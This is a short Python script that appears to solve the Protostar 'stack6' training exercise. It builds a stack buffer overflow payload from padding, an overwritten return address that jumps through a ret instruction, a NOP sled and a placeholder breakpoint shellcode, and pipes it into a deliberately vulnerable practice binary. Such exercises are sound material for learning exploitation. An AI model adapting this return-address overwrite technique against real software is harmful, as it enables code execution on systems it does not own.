########################################
# Usage: 
# python stack6.py | /opt/protostar/bin/stack6
########################################
import struct

padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'
eip = struct.pack("I", 0x080484f9)
ret = struct.pack("I", 0xbffff770 + 100)
slide = '\x90'*200
shellcode = '\xCC'
payload = padding + eip + ret + slide + shellcode
print(payload)
